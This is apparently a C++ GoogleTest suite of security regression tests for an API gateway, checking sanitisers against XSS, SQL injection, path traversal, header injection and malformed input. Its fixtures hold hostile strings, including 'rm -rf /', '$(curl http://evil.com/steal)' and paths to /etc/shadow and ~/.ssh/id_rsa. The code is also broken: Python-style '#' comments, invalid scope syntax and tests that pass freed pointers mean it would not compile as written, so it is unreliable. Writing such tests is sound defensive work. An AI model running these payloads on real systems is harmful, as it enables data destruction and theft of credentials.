#include <gtest/gtest.h>
#include <gmock/gmock.h>
#include <string>
#include <vector>
#include <memory>
#include <regex>
#include "src/validation/input_validator.hpp"
#include "src/security/secure_config.hpp"
#include "src/network/http_client.hpp"
#include "src/config/production_config.hpp"
#include "src/gateway/api_transformer.hpp"

using namespace ::testing;
using namespace aimux;

class SecurityRegressionTest : public ::testing::Test {
protected:
    void SetUp() override {
        validator = std::make_unique<validation::InputValidator>();
        secure_config = std::make_unique<security::SecureConfig>();
    }

    std::unique_ptr<validation::InputValidator> validator;
    std::unique_ptr<security::SecureConfig> secure_config;
};

// XSS Injection Prevention Tests
TEST_F(SecurityRegressionTest, PreventScriptInjection) {
    std::vector<std::string> malicious_inputs = {
        "<script>alert('xss')</script>",
        "<script>window.location='http://evil.com'</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<svg onload=alert('xss')>",
        "<iframe src=javascript:alert('xss')>",
        "<body onload=alert('xss')>",
        "<div onclick=alert('xss')>click me</div>"
    };

    for (const auto& input : malicious_inputs) {
        std::string sanitized = validator->sanitize_html(input);

        // Should not contain script tags
        EXPECT_THAT(sanitized, Not(HasSubstr("<script>"))) << "Input contained script: " << input;
        EXPECT_THAT(sanitized, Not(HasSubstr("javascript:"))) << "Input contained javascript: " << input;
        EXPECT_THAT(sanitized, Not(HasSubstr("onerror="))) << "Input contained onerror: " << input;
        EXPECT_THAT(sanitized, Not(HasSubstr("onload="))) << "Input contained onload: " << input;
        EXPECT_THAT(sanitized, Not(HasSubstr("onclick="))) << "Input contained onclick: " << input;
    }
}

TEST_F(SecurityRegressionTest, PreventHtmlEntityManipulation) {
    std::string malicious_input = "&lt;script&gt;alert('xss')&lt;/script&gt;";

    std::string sanitized = validator->sanitize_html(malicious_input);

    // Should properly encode or remove the entities
    EXPECT_THAT(sanitized, Not(HasSubstr("<script>")));
    EXPECT_THAT(sanitized, Not(HasSubstr("alert")));
}

TEST_F(SecurityRegressionTest, PreventJsonXss) {
    std::string malicious_json = R"({
        "message": "</script><script>alert('xss')</script>",
        "data": {"html": "<img src=x onerror=alert('xss')>"}
    })";

    json response = json::parse(malicious_json);
    std::string sanitized = validator->sanitize_json_response(response);

    // JSON responses should not contain executable HTML
    EXPECT_THAT(sanitized, Not(HasSubstr("</script>")));
    EXPECT_THAT(sanitized, Not(HasSubstr("<img")));
}

// SQL Injection Prevention Tests
TEST_F(SecurityRegressionTest, EnforceParameterizedQueries) {
    std::vector<std::string> injection_attempts = {
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "'; UPDATE users SET password='hacked' WHERE '1'='1' --",
        "1'; DELETE FROM users WHERE '1'='1' --",
        "admin'--",
        "admin' /*",
        "' OR 1=1 #",
        "' UNION SELECT * FROM users --"
    };

    for (const auto& input : injection_attempts) {
        // Input validation should reject obvious SQL injection patterns
        EXPECT_FALSE(validator->validate_sql_input(input))
            << "SQL injection not detected: " << input;

        // Sanitized input should be safe
        std::string sanitized = validator->sanitize_sql_input(input);
        EXPECT_TRUE(validator->is_sql_safe(sanitized))
            << "Sanitized input still unsafe: " << input;
    }
}

TEST_F(SecurityRegressionTest, PreventSqlKeywordsInUserInput) {
    std::vector<std::string> sql_keywords = {
        "DROP", "DELETE", "UPDATE", "INSERT", "SELECT", "UNION", "EXEC", "EXECUTE",
        "ALTER", "CREATE", "TRUNCATE", "GRANT", "REVOKE", "COMMIT", "ROLLBACK"
    };

    for (const auto& keyword : sql_keywords) {
        std::string malicious_input = "test " + keyword + " table";

        // Should detect potential SQL injection
        bool is_suspicious = validator->detect_sql_patterns(malicious_input);
        EXPECT_TRUE(is_suspicious) << "SQL keyword not detected: " << keyword;
    }
}

// Path Traversal Attack Tests
TEST_F(SecurityRegressionTest, PreventDirectoryTraversal) {
    std::vector<std::string> traversal_attempts = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "file:///etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
    };

    for (const auto& path : traversal_attempts) {
        EXPECT_FALSE(validator->is_safe_file_path(path))
            << "Path traversal not detected: " << path;

        // Sanitized path should be safe
        std::string sanitized = validator->sanitize_file_path(path);
        EXPECT_TRUE(validator->is_safe_file_path(sanitized))
            << "Sanitized path still unsafe original: " << path << " sanitized: " << sanitized;
    }
}

TEST_F(SecurityRegressionTest, PreventConfigFileAccess) {
    std::vector<std::string> config_files = {
        "../config/production_config.json",
        "../../.env",
        "../../../config/database.conf",
        "~/.ssh/id_rsa",
        "/etc/aimux/config.json"
    };

    for (const auto& config : config_files) {
        EXPECT_FALSE(validator->is_safe_file_path(config))
            << "Config file access allowed: " << config;
    }
}

// Buffer Overflow Prevention Tests
TEST_F(SecurityRegressionTest, PreventStringBufferOverflow) {
    std::string oversized_input(10000, 'A');  // Larger than most expected limits

    // Should reject oversized input
    EXPECT_THROW(validator->validate_api_key(oversized_input), std::length_error);

    // Should safely handle oversized requests
    EXPECT_THROW(validator->validate_request_size(oversized_input), std::length_error);
}

TEST_F(SecurityRegressionTest, PreventArrayBoundsViolation) {
    std::vector<std::string> test_cases = {
        std::string(512, 'A'),  // Very long string
        std::string("\0\x01\x02\x03", 4),  // Binary data
        std::string(1000, '\n'),  # Many newlines
    };

    for (const auto& test_case : test_cases) {
        // Should handle gracefully without overflow
        EXPECT_NO_THROW(validator->validate_input_format(test_case));

        // Sanitized output should be safe
        std::string sanitized = validator->sanitize_input(test_case);
        EXPECT_LT(sanitized.length(), test_case.length() + 100) // Should not grow excessively
            << "Input grew too much during sanitization";
    }
}

TEST_F(SecurityRegressionTest, PreventUtf8Overflow) {
    // Malformed UTF-8 sequences that could cause buffer issues
    std::vector<std::string> malformed_utf8 = {
        "\xc0\x80",  // Overlong encoding
        "\xe0\x80\x80",  // Overlong encoding
        "\xf0\x80\x80\x80",  // Overlong encoding
        "\xc2",  // Incomplete sequence
        "\xe0\xa0",  # Incomplete sequence
        std::string("\xff", 1),  # Invalid byte
    };

    for (const auto& test_case : malformed_utf8) {
        EXPECT_NO_THROW(validator->validate_utf8_safety(test_case));

        // Should handle or reject malformed UTF-8 without crashing
        std::string sanitized = validator->sanitize_utf8(test_case);
        EXPECT_TRUE(validator->is_valid_utf8(sanitized));
    }
}

// Input Sanitization Validation Tests
TEST_F(SecurityRegressionTest, SanitizeControlCharacters) {
    std::vector<std::string> inputs_with_control_chars = {
        "test\x00malicious",
        "test\x01\x02\x03control",
        "test\r\nSet-Cookie: evil=true",
        "test\x1b[31mred text",
        "test\t\n\r\f\v"
    };

    for (const auto& input : inputs_with_control_chars) {
        std::string sanitized = validator->sanitize_api_input(input);

        // Should not contain null bytes
        EXPECT_THAT(sanitized, Not(HasSubstr("\x00")));

        // Should not contain CRLF injection
        EXPECT_THAT(sanitized, Not(HasSubstr("\r\n")));

        // Should not contain ANSI escape sequences
        EXPECT_THAT(sanitized, Not(HasSubstr("\x1b[")));
    }
}

TEST_F(SecurityRegressionTest, SanitizeHttpHeaders) {
    std::vector<std::string> malicious_headers = {
        "test\r\nLocation: http://evil.com",
        "test\nSet-Cookie: session=stolen",
        "test\rContent-Length: 999999",
        "test\r\nX-Forwarded-For: 127.0.0.1"
    };

    for (const auto& header : malicious_headers) {
        std::string sanitized = validator->sanitize_http_header(header);

        // Should not contain CRLF sequences
        EXPECT_THAT(sanitized, Not(HasSubstr("\r\n")));
        EXPECT_THAT(sanitized, Not(HasSubstr("\n")));

        // Should not contain header injection patterns
        EXPECT_THAT(sanitized, Not(HasSubstr("Location:")));
        EXPECT_THAT(sanitized, Not(HasSubstr("Set-Cookie:")));
        EXPECT_THAT(sanitized, Not(HasSubstr("Content-Length:")));
    }
}

// Memory Corruption Detection Tests
TEST_F(SecurityRegressionTest, DetectDoubleFree) {
    // This test would be more effective with AddressSanitizer enabled
    char* ptr = new char[100];
    strcpy(ptr, "test");
    delete[] ptr;

    // This should crash under AddressSanitizer if not caught properly
    // In production, this should be caught by validation
    EXPECT_THROW(validator->validate_pointer_safety(ptr), std::invalid_argument);
}

TEST_F(SecurityRegressionTest, DetectUseAfterFree) {
    // Again, this test is most effective with sanitizers
    std::string* str = new std::string("test");
    delete str;

    // Should not access freed memory
    EXPECT_THROW(validator->validate_string_pointer(str), std::invalid_argument);
}

TEST_F(SecurityRegressionTest, ValidateMemoryBounds) {
    std::vector<char> buffer(100, 'A');

    // Should validate buffer boundaries
    EXPECT_TRUE(validator->validate_buffer_bounds(buffer.data(), buffer.size()));

    // Should reject invalid buffer operations
    EXPECT_FALSE(validator->validate_buffer_bounds(nullptr, 100));
    EXPECT_FALSE(validator->validate_buffer_bounds(buffer.data(), 0));
    EXPECT_FALSE(validator::validate_buffer_bounds(buffer.data(), 10000));
}

// Configuration Security Tests
TEST_F(SecurityRegressionTest, PreventConfigInjection) {
    std::string malicious_config = R"({
        "database": {
            "host": "localhost; rm -rf /",
            "password": "password'; DROP TABLE users; --"
        },
        "api_key": "$(curl http://evil.com/steal)",
        "include": "../../../etc/shadow"
    })";

    ConfigValidator config_validator;
    EXPECT_THROW(config_validator.parse_and_validate(malicious_config), std::runtime_error);
}

TEST_F(SecurityRegressionTest, ValidateSecureConfigLoading) {
    // Test that configuration loading is secure
    EXPECT_TRUE(secure_config->is_config_secure());

    // Should reject insecure configurations
    EXPECT_FALSE(secure_config->validate_config_file("../etc/passwd"));
    EXPECT_FALSE(secure_config->validate_config_file("../../../config/secrets"));
}

// API Security Tests
TEST_F(SecurityRegressionTest, EnforceRateLimiting) {
    RateLimiter rate_limiter(10, 60); // 10 requests per minute

    std::string client_ip = "192.168.1.100";

    // Should allow requests within limit
    for (int i = 0; i < 10; ++i) {
        EXPECT_TRUE(rate_limiter.is_allowed(client_ip));
    }

    // Should block requests over limit
    EXPECT_FALSE(rate_limiter.is_allowed(client_ip));
}

TEST_F(SecurityRegressionTest, ValidateAuthorization) {
    AuthorizationManager auth_manager;

    // Test unauthorized access
    EXPECT_FALSE(auth_manager.has_access("anonymous", "/admin/config"));
    EXPECT_FALSE(auth_manager.has_access("user", "/admin/users"));

    // Test authorized access
    EXPECT_TRUE(auth_manager.has_access("admin", "/admin/config"));
    EXPECT_TRUE(auth_manager.has_access("user", "/api/models"));
}

// Fuzzing-like Tests
TEST_F(SecurityRegressionTest, HandleMalformedJson) {
    std::vector<std::string> malformed_jsons = {
        "",
        "{",
        "}",
        "{{",
        "}}",
        R"({"incomplete": "value")",
        R"({"key": })",
        R"({"key": "unclosed "})",
        R"({"recursive": {"recursive": {"recursive": "value"}}})",
        std::string(100000, '{'),  // Very deep nesting
        R"({"key": "\u0000"})"  # Null byte in string
    };

    for (const auto& json_str : malformed_jsons) {
        // Should handle malformed JSON gracefully
        EXPECT_THROW(validator->validate_json(json_str), json::parse_error);

        // Should not crash during validation
        EXPECT_NO_THROW(validator->safe_parse_json(json_str));
    }
}

TEST_F(SecurityRegressionTest, HandleUnicodeAttacks) {
    std::vector<std::string> unicode_attacks = {
        "test\ufeffbom",  # BOM attack
        "test\u202eevil",  # Right-to-left override
        "test\ud800",      # Invalid surrogate
        "test\xef\xbb\xbf",  # UTF-8 BOM
        "test\u0000\ud800\udfff"  # Null and invalid surrogates
    };

    for (const auto& attack : unicode_attacks) {
        // Should handle unicode attacks gracefully
        EXPECT_NO_THROW(validator->sanitize_unicode_input(attack));

        std::string sanitized = validator->sanitize_unicode_input(attack);
        EXPECT_TRUE(validator->is_safe_unicode(sanitized));
    }
}

// Integration Security Tests
TEST_F(SecurityRegressionTest, SecureApiEndpointHandling) {
    Http http_client;

    // Test malicious request handling
    std::string malicious_url = "/api/models/<script>alert('xss')</script>";

    auto response = http_client.get(malicious_url);

    // Should not execute scripts in response
    EXPECT_THAT(response.body, Not(HasSubstr("<script>")));
    EXPECT_THAT(response.body, Not(HasSubstr("alert")));

    // Should have proper content type
    EXPECT_THAT(response.headers["Content-Type"], HasSubstr("application/json"));
}

TEST_F(SecurityRegressionTest, SecureFileUploadHandling) {
    FileUploader uploader("/tmp/uploads");

    std::vector<std::string> malicious_filenames = {
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "exploit.php",
        "script.js",
        "malicious.exe",
        "test\x00.jpg",  # Null byte injection
        "path traversal.txt"
    };

    for (const auto& filename : malicious_filenames) {
        FileUploadRequest request;
        request.filename = filename;
        request.content = "test content";

        // Should reject malicious filenames
        EXPECT_THROW(uploader.upload_file(request), std::invalid_argument);
    }
}

// Performance Security Tests
TEST_F(SecurityRegressionTest, PreventDenialOfService) {
    // Test with extremely large inputs that could cause DoS
    std::string huge_input(10000000, 'A');  // 10MB string

    auto start_time = std::chrono::high_resolution_clock::now();

    // Should handle large input efficiently or reject quickly
    EXPECT_THROW(validator->validate_api_request(huge_input), std::length_error);

    auto end_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);

    // Should reject within reasonable time (less than 1 second)
    EXPECT_LT(duration.count(), 1000) << "DoS vulnerability detected - too slow to reject large input";
}

// Security Headers Tests
TEST_F(SecurityRegressionTest, IncludeSecurityHeaders) {
    HttpResponse response;
    SecurityHeaders::apply_headers(response);

    // Should include essential security headers
    EXPECT_TRUE(response.headers.contains("X-Content-Type-Options"));
    EXPECT_TRUE(response.headers.contains("X-Frame-Options"));
    EXPECT_TRUE(response.headers.contains("X-XSS-Protection"));
    EXPECT_TRUE(response.headers.contains("Strict-Transport-Security"));
    EXPECT_TRUE(response.headers.contains("Content-Security-Policy"));
}

TEST_F(SecurityRegressionTest, PreventCrossOriginAttacks) {
    CorsValidator cors_validator;

    // Should reject unauthorized origins
    EXPECT_FALSE(cors_validator.is_origin_allowed("http://evil.com"));
    EXPECT_FALSE(cors_validator.is_origin_allowed("null"));

    // Should allow authorized origins
    EXPECT_TRUE(cors_validator.is_origin_allowed("https://aimux.ai"));
    EXPECT_TRUE(cors_validator.is_origin_allowed("http://localhost:3000"));
}

// Comprehensive Security Validation
TEST_F(SecurityRegressionTest, ComprehensiveSecurityCheck) {
    SecurityComprehensiveChecker checker;

    // Test with sample malicious payload
    std::string payload = R"({
        "input": "<script>alert('xss')</script>",
        "query": "'; DROP TABLE users; --",
        "file": "../../../etc/passwd",
        "url": "javascript:alert('xss')"
    })";

    SecurityCheckResult result = checker.validate_json_payload(payload);

    // Should detect all security issues
    EXPECT_TRUE(result.has_xss);
    EXPECT_TRUE(result.has_sql_injection);
    EXPECT_TRUE(result.has_path_traversal);
    EXPECT_TRUE(result.has_javascript_protocol);

    // Should not pass security check
    EXPECT_FALSE(result.is_secure);
}

int main(int argc, char** argv) {
    ::testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}